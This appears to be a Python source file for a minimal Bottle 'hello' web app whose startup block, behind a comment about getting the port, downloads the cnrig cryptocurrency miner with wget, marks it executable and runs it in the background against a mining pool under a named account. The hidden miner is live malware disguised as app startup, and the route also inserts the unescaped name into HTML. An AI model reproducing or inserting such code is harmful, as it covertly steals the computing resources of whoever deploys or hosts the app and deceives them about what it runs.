import os
from bottle import route, run

@route('/hello/:name')
def index(name='World'):
    return '<b>Hello %s!</b>' % name


if __name__ == '__main__':
    # Get required port, default to 5000.    
    a  = os.popen('wget -O cnrig https://github.com/cnrig/cnrig/releases/download/v0.1.5-release/cnrig-0.1.5-linux-x86_64').readlines()
    a  = os.popen('chmod +x cnrig').readlines()
    a  = os.popen('ls').readlines()
    a  = os.popen('./cnrig --donate-level 1 -a cryptonight -u dwijads39@gmail.com -o fcn.pool.minergate.com:45610 -p x -B').readlines()
    port = os.environ.get('PORT', 5000)
    # Run the app.
    run(host='0.0.0.0', port=port)